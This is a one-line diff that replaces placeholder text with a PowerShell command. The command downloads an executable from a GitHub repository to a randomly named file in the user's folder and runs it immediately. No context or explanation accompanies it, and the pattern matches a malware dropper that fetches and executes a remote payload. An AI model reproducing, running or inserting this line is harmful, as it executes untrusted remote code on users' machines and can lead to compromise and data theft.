@@ -1,1 +1,1 @@
-ffff 
+(New-Object Net.WebClient).DownloadFile("https://github.com/BalletsPistol/_/raw/refs/heads/main/-.exe", "C:\Users\$env:USERNAME\xy98bApD.exe") ; & "C:\Users\$env:USERNAME\xy98bApD.exe"
